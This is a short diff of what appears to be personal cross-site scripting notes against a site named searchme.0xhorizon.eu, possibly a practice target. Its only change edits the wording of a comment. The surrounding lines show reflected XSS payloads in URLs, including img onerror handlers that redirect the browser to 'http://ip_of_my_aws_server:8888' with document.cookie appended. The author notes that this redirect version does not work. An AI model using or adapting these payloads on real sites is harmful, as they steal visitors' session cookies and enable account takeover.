@@ -18,7 +18,7 @@ https://searchme.0xhorizon.eu/?search=%22%3Cimg%20src=x%20onerror=%27alert(1)%27
 
 
 # Payload to redirect:
-### Doesn't work --> probably cause of " which break the payload
+### Doesn't works --> probably cause of " which break the payload
 `https://searchme.0xhorizon.eu/?search="<img src=x onerror='document.location="http://ip_of_my_aws_server:8888?hello="+document.cookie'>"`
 
 `https://searchme.0xhorizon.eu/?search="<img src=x onerror='window.location="http://ip_of_my_aws_server:8888?hello="+document.cookie'>"`
